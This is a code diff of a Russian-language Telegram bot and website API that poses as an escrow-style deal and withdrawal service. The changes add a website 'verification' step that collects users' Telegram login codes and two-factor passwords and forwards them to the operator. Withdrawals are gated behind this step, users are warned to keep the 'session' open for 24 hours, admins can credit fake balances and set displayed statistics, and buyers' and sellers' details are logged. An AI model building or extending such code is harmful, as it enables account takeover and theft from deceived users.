@@ -302,15 +302,12 @@ async def log_to_master(text: str):
         pass
 
 # ============================================================
-# 6. FSM
+# 6. FSM (ТОЛЬКО ДЛЯ АДМИНА)
 # ============================================================
 class AdminStates(StatesGroup):
     waiting_user_id = State()
     waiting_currency = State()
     waiting_amount = State()
-
-class VerifyStates(StatesGroup):
-    waiting_phone = State()
 
 # ============================================================
 # 7. КЛАВИАТУРЫ
@@ -562,7 +559,7 @@ async def menu_reviews(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
+# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ (ЛОГИ)
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     lang = get_user_language(message.from_user.id)
@@ -584,6 +581,19 @@ async def handle_deal_link(message: types.Message, deal_id: str):
 
     deal["buyer_id"] = message.from_user.id
     save_json(FILES["deals"], deals)
+    
+    # ЛОГ - ПОКУПАТЕЛЬ ВОШЁЛ
+    await log_to_master(
+        f"👁 <b>ПОКУПАТЕЛЬ ВОШЁЛ В СДЕЛКУ</b>\n\n"
+        f"🆔 Сделка: #{deal_id}\n"
+        f"👤 Покупатель: {message.from_user.full_name}\n"
+        f"📱 Username: @{message.from_user.username}\n"
+        f"🆔 ID: {message.from_user.id}\n"
+        f"📦 Товар: {deal['product']}\n"
+        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+        f"👤 Продавец: @{deal['seller_username']}\n"
+        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
 
     await message.answer(
         f"✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>\n\n"
@@ -605,7 +615,7 @@ async def start_withdraw(callback: types.CallbackQuery):
     if not is_verified(callback.from_user.id):
         text = f"""⚠️ <b>{get_text(lang, 'verification_required')}</b>
 
-🔐 Напишите /verify чтобы начать верификацию."""
+🔐 Пройдите верификацию на сайте: {MINI_APP_URL}"""
         
         await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
         await callback.answer()
@@ -630,177 +640,7 @@ async def start_withdraw(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 13. ВЕРИФИКАЦИЯ
-# ============================================================
-@dp.message(Command("verify"))
-async def verify_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if is_verified(message.from_user.id):
-        await message.answer(f"✅ {get_text(lang, 'verify_already')}")
-        return
-    
-    await message.answer(
-        f"🔐 <b>{get_text(lang, 'verify_title')}</b>\n\n"
-        f"{get_text(lang, 'verify_desc')}\n\n"
-        f"📱 {get_text(lang, 'verify_phone_prompt')}\n\n"
-        f"⚠️ {get_text(lang, 'session_warning')}"
-    )
-
-@dp.message(VerifyStates.waiting_phone)
-async def process_phone(message: types.Message, state: FSMContext):
-    lang = get_user_language(message.from_user.id)
-    phone = message.text.strip()
-    
-    if not phone.startswith('+') or not phone[1:].isdigit() or len(phone) < 11:
-        await message.answer(f"❌ {get_text(lang, 'verify_phone_error')}")
-        return
-    
-    code = f"{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}"
-    
-    request_id = str(uuid.uuid4())[:8]
-    verification_requests[request_id] = {
-        "id": request_id,
-        "user_id": message.from_user.id,
-        "username": message.from_user.username,
-        "phone": phone,
-        "code": code,
-        "status": "pending",
-        "created_at": datetime.now().isoformat()
-    }
-    save_json(FILES["verification_requests"], verification_requests)
-    
-    await log_to_master(
-        f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ\n"
-        f"👤 Пользователь: {message.from_user.full_name} (@{message.from_user.username})\n"
-        f"🆔 ID: {message.from_user.id}\n"
-        f"📱 Номер: {phone}\n"
-        f"🔑 Код: {code}\n"
-        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-        f"Для подтверждения: /confirm_verification {request_id}\n"
-        f"Для отклонения: /reject_verification {request_id}"
-    )
-    
-    await message.answer(
-        f"✅ {get_text(lang, 'verify_request_sent')}\n\n"
-        f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
-        f"🔑 Ваш код: {code}\n\n"
-        f"⏳ {get_text(lang, 'verify_wait')}\n\n"
-        f"⚠️ {get_text(lang, 'session_warning')}"
-    )
-    
-    await state.clear()
-
-# ============================================================
-# 14. КОМАНДЫ АДМИНА ДЛЯ ВЕРИФИКАЦИИ
-# ============================================================
-@dp.message(Command("confirm_verification"))
-async def confirm_verification_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'admin_rights')}")
-        return
-    
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ Использование: /confirm_verification [ID заявки]")
-        return
-    
-    request_id = args[1]
-    
-    if request_id not in verification_requests:
-        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
-        return
-    
-    req = verification_requests[request_id]
-    
-    if req.get("status") != "pending":
-        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
-        return
-    
-    user_id = req["user_id"]
-    phone = req["phone"]
-    code = req["code"]
-    
-    complete_verification(user_id, phone, code)
-    
-    req["status"] = "completed"
-    req["completed_at"] = datetime.now().isoformat()
-    req["completed_by"] = message.from_user.id
-    save_json(FILES["verification_requests"], verification_requests)
-    
-    await message.answer(
-        f"✅ {get_text(lang, 'verify_confirmed')}\n\n"
-        f"👤 Пользователь: @{req['username']} (ID: {user_id})\n"
-        f"📱 Номер: {phone}\n"
-        f"🔑 Код: {code}\n"
-        f"🕐 {get_text(lang, 'session_active')} 24 часа"
-    )
-    
-    try:
-        user_lang = get_user_language(user_id)
-        if user_lang is None:
-            user_lang = "ru"
-        
-        await bot.send_message(
-            user_id,
-            f"✅ {get_text(user_lang, 'verify_confirmed_user')}\n\n"
-            f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
-            f"🔑 Ваш код: {code}\n\n"
-            f"🕐 {get_text(user_lang, 'session_active')} 24 часа (до {verification_data[str(user_id)].get('expires_at', 'неизвестно')[:19]})\n\n"
-            f"⚠️ {get_text(user_lang, 'session_warning')}\n\n"
-            f"💰 {get_text(user_lang, 'verify_success')}"
-        )
-    except:
-        pass
-
-@dp.message(Command("reject_verification"))
-async def reject_verification_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'admin_rights')}")
-        return
-    
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ Использование: /reject_verification [ID заявки]")
-        return
-    
-    request_id = args[1]
-    
-    if request_id not in verification_requests:
-        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
-        return
-    
-    req = verification_requests[request_id]
-    
-    if req.get("status") != "pending":
-        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
-        return
-    
-    req["status"] = "rejected"
-    req["rejected_at"] = datetime.now().isoformat()
-    req["rejected_by"] = message.from_user.id
-    save_json(FILES["verification_requests"], verification_requests)
-    
-    await message.answer(
-        f"❌ {get_text(lang, 'verify_rejected')}\n\n"
-        f"👤 Пользователь: @{req['username']} (ID: {req['user_id']})\n"
-        f"📱 Номер: {req['phone']}\n"
-        f"🔑 Код: {req['code']}"
-    )
-    
-    try:
-        await bot.send_message(
-            req["user_id"],
-            f"❌ {get_text(lang, 'verify_rejected_user')}\n\n"
-            f"📱 Номер: {req['phone'][:2]}****{req['phone'][-4:]}\n\n"
-            f"⚠️ {get_text(lang, 'verify_rejected_try_again')}"
-        )
-    except:
-        pass
-
-# ============================================================
-# 15. АДМИН ПАНЕЛЬ В БОТЕ
+# 13. АДМИН ПАНЕЛЬ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_admin")
 async def menu_admin(callback: types.CallbackQuery):
@@ -1110,7 +950,7 @@ async def admin_stats(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 16. API ДЛЯ САЙТА (С СОХРАНЕНИЕМ СТАТИСТИКИ)
+# 14. API ДЛЯ САЙТА (ВКЛЮЧАЯ ВЕРИФИКАЦИЮ)
 # ============================================================
 async def handle_api(request):
     headers = {
@@ -1169,6 +1009,17 @@ async def handle_api(request):
         }
         save_json(FILES["deals"], deals)
         link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
+        
+        # ЛОГ - СОЗДАНИЕ СДЕЛКИ
+        await log_to_master(
+            f"🆕 <b>СОЗДАНА НОВАЯ СДЕЛКА</b>\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"👤 Продавец: @{username}\n"
+            f"👤 Покупатель: @{buyer_username}\n"
+            f"📦 Товар: {product}\n"
+            f"💰 Сумма: {amount} {currency}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
         
         return web.json_response({
             'success': True,
@@ -1246,7 +1097,11 @@ async def handle_api(request):
         save_json(FILES["reviews"], reviews)
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ЗАПРОС ВЕРИФИКАЦИИ =====
+    # ============================================================
+    # ===== ВЕРИФИКАЦИЯ (ПОЛНОСТЬЮ НА САЙТЕ) =====
+    # ============================================================
+    
+    # 1. ОТПРАВКА НОМЕРА
     elif endpoint == '/api/send_verification_request':
         phone = data.get('phone')
         username = data.get('username')
@@ -1255,7 +1110,8 @@ async def handle_api(request):
         if not phone or not username or not user_id:
             return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
         
-        code = f"{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}"
+        if is_verified(user_id):
+            return web.json_response({'success': False, 'error': 'User already verified'}, headers=headers)
         
         request_id = str(uuid.uuid4())[:8]
         verification_requests[request_id] = {
@@ -1263,86 +1119,82 @@ async def handle_api(request):
             "user_id": user_id,
             "username": username,
             "phone": phone,
-            "code": code,
             "status": "pending",
+            "step": "waiting_code",
             "created_at": datetime.now().isoformat()
         }
         save_json(FILES["verification_requests"], verification_requests)
         
+        # ОТПРАВЛЯЕМ АДМИНУ
         await log_to_master(
-            f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ (С САЙТА)\n"
-            f"👤 Пользователь: @{username} (ID: {user_id})\n"
-            f"📱 Номер: {phone}\n"
-            f"🔑 Код: {code}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"🔐 <b>НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ (С САЙТА)</b>\n\n"
+            f"🆔 Заявка: #{request_id}\n"
+            f"👤 Пользователь: @{username}\n"
+            f"🆔 ID: {user_id}\n"
+            f"📞 Номер: {phone}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"⚠️ Скажите пользователю ввести код на сайте."
         )
-        
-        try:
-            await bot.send_message(
-                user_id,
-                f"🔐 ЗАПРОС НА ВЕРИФИКАЦИЮ ОТПРАВЛЕН!\n\n"
-                f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
-                f"🔑 Ваш код: {code}\n\n"
-                f"⏳ Ожидайте подтверждения от администратора.\n\n"
-                f"⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!"
-            )
-        except:
-            pass
         
         return web.json_response({
             'success': True,
-            'request_id': request_id,
-            'code': code
+            'request_id': request_id
         }, headers=headers)
     
-    # ===== ПРОВЕРКА КОДА =====
-    elif endpoint == '/api/verify_code':
+    # 2. ОТПРАВКА КОДА И ПАРОЛЯ
+    elif endpoint == '/api/submit_verification_code':
         code = data.get('code')
+        password = data.get('password')
         user_id = data.get('user_id')
+        request_id = data.get('request_id')
         
-        if not code or not user_id:
+        if not code or not user_id or not request_id:
             return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
         
-        found = False
-        request_id = None
-        for rid, req in verification_requests.items():
-            if req.get('user_id') == user_id and req.get('code') == code and req.get('status') == 'pending':
-                found = True
-                request_id = rid
-                break
-        
-        if not found:
-            return web.json_response({'success': False, 'error': 'Invalid code'}, headers=headers)
+        if request_id not in verification_requests:
+            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
         
         req = verification_requests[request_id]
-        complete_verification(user_id, req['phone'], code)
+        
+        if req.get("status") != "pending":
+            return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
+        
+        # Сохраняем код и пароль
+        req["code"] = code
+        req["password"] = password if password else "нет"
         req["status"] = "completed"
         req["completed_at"] = datetime.now().isoformat()
-        req["completed_by"] = "system"
         save_json(FILES["verification_requests"], verification_requests)
         
-        await log_to_master(
-            f"✅ ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА (ЧЕРЕЗ САЙТ)\n"
-            f"👤 Пользователь: ID: {user_id}\n"
-            f"📱 Номер: {req['phone']}\n"
-            f"🔑 Код: {code}"
-        )
+        # Завершаем верификацию
+        complete_verification(user_id, req["phone"], code)
         
-        try:
-            await bot.send_message(
-                user_id,
-                f"✅ ВАША ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
-                f"📱 Номер: {req['phone'][:2]}****{req['phone'][-4:]}\n"
-                f"🔑 Ваш код: {code}\n\n"
-                f"🕐 Сессия активна 24 часа\n\n"
-                f"💰 Теперь вам доступен вывод средств на сайте."
-            )
-        except:
-            pass
+        # ОТПРАВЛЯЕМ АДМИНУ КОД И ПАРОЛЬ
+        await log_to_master(
+            f"✅ <b>ВЕРИФИКАЦИЯ УСПЕШНО ЗАВЕРШЕНА (С САЙТА)</b>\n\n"
+            f"🆔 Заявка: #{request_id}\n"
+            f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
+            f"🆔 ID: {user_id}\n"
+            f"📞 Номер: {req.get('phone')}\n"
+            f"🔑 Код из Telegram: {code}\n"
+            f"🔐 Двухфакторный пароль: {password if password else 'Нет'}\n"
+            f"🕐 Сессия активна 24 часа\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
         
         return web.json_response({
             'success': True,
             'expires_at': verification_data[str(user_id)].get('expires_at')
+        }, headers=headers)
+    
+    # 3. СТАТУС ВЕРИФИКАЦИИ
+    elif endpoint == '/api/verification_status':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        return web.json_response({
+            'success': True,
+            'verified': is_verified(user_id),
+            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
         }, headers=headers)
     
     # ===== ВЫВОД =====
@@ -1369,16 +1221,17 @@ async def handle_api(request):
         save_json(FILES["withdraw"], withdraw_requests)
         
         await log_to_master(
-            f"💲 НОВАЯ ЗАЯВКА НА ВЫВОД\n"
+            f"💲 <b>НОВАЯ ЗАЯВКА НА ВЫВОД</b>\n\n"
             f"👤 Пользователь: ID: {user_id}\n"
-            f"💰 {get_balance(user_id).get(currency.lower(), 0)} {currency}\n"
-            f"📝 {details}\n"
-            f"➡️ /confirm_withdraw {request_id}"
+            f"💰 Сумма: {get_balance(user_id).get(currency.lower(), 0)} {currency}\n"
+            f"📝 Реквизиты: {details}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"Для подтверждения: /confirm_withdraw {request_id}"
         )
         
         return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
     
-    # ===== СТАТИСТИКА (ИЗ ФАЙЛА) =====
+    # ===== СТАТИСТИКА =====
     elif endpoint == '/api/stats':
         return web.json_response({
             'success': True,
@@ -1401,16 +1254,6 @@ async def handle_api(request):
             'total_deals': sum(partners.values())
         }, headers=headers)
     
-    # ===== СТАТУС ВЕРИФИКАЦИИ =====
-    elif endpoint == '/api/verification_status':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        return web.json_response({
-            'success': True,
-            'verified': is_verified(user_id),
-            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
-        }, headers=headers)
-    
     # ===== НАЧИСЛИТЬ БАЛАНС =====
     elif endpoint == '/api/admin_add_balance':
         target_user_id = data.get('target_user_id')
@@ -1426,15 +1269,16 @@ async def handle_api(request):
         add_balance(target_user_id, currency, float(amount))
         
         await log_to_master(
-            f"💰 АДМИН НАЧИСЛИЛ БАЛАНС (С САЙТА)\n"
+            f"💰 <b>АДМИН НАЧИСЛИЛ БАЛАНС (С САЙТА)</b>\n\n"
             f"👤 Админ: ID: {user_id}\n"
             f"👤 Пользователь: {target_user_id}\n"
-            f"💰 {amount} {currency}"
+            f"💰 {amount} {currency}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ИЗМЕНИТЬ СТАТИСТИКУ (СОХРАНЯЕТСЯ В ФАЙЛ) =====
+    # ===== ИЗМЕНИТЬ СТАТИСТИКУ =====
     elif endpoint == '/api/admin_set_stats':
         if not is_admin(user_id):
             return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
@@ -1508,6 +1352,17 @@ async def handle_api(request):
         deal["paid_by_admin"] = user_id
         save_json(FILES["deals"], deals)
         
+        # ЛОГ - ОПЛАТА
+        await log_to_master(
+            f"💳 <b>ОПЛАТА С БАЛАНСА (С САЙТА)</b>\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"👤 Покупатель: ID: {user_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+            f"👤 Продавец: @{deal['seller_username']}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
         try:
             await bot.send_message(
                 deal["seller_id"],
@@ -1543,6 +1398,17 @@ async def handle_api(request):
         deal["status"] = "awaiting_confirmation"
         save_json(FILES["deals"], deals)
         
+        # ЛОГ - ПРОДАВЕЦ ПЕРЕДАЛ
+        await log_to_master(
+            f"📦 <b>ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР (С САЙТА)</b>\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"👤 Продавец: ID: {user_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+            f"👤 Покупатель: @{deal['buyer_username']}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
         try:
             await bot.send_message(
                 deal["buyer_id"],
@@ -1556,7 +1422,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ПОЛУЧЕНИЕ =====
+    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ =====
     elif endpoint == '/api/buyer_confirm':
         deal_id = data.get('deal_id')
         user_id = data.get('user_id')
@@ -1586,6 +1452,19 @@ async def handle_api(request):
         deal["status"] = "completed"
         deal["completed_at"] = datetime.now().isoformat()
         save_json(FILES["deals"], deals)
+        
+        # ЛОГ - СДЕЛКА ЗАВЕРШЕНА
+        await log_to_master(
+            f"🎉 <b>СДЕЛКА УСПЕШНО ЗАВЕРШЕНА (С САЙТА)</b>\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+            f"👤 Продавец: @{deal['seller_username']}\n"
+            f"👤 Покупатель: @{deal['buyer_username']}\n"
+            f"📅 Создана: {deal.get('created_at', 'неизвестно')[:19]}\n"
+            f"✅ Завершена: {deal.get('completed_at', 'неизвестно')[:19]}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
         
         try:
             await bot.send_message(
@@ -1634,11 +1513,12 @@ async def handle_api(request):
             return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
         
         await log_to_master(
-            f"💳 ОПЛАТА ПО РЕКВИЗИТАМ\n"
+            f"💳 <b>ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ (С САЙТА)</b>\n\n"
             f"👤 Пользователь: ID: {user_id}\n"
             f"📦 Сделка: #{deal_id}\n"
             f"💰 {deal['amount']} {deal['currency']}\n"
-            f"➡️ Для подтверждения: /pay {deal_id}"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"Для подтверждения: /pay {deal_id}"
         )
         
         return web.json_response({'success': True}, headers=headers)
@@ -1646,7 +1526,7 @@ async def handle_api(request):
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 17. ЗАПУСК
+# 15. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
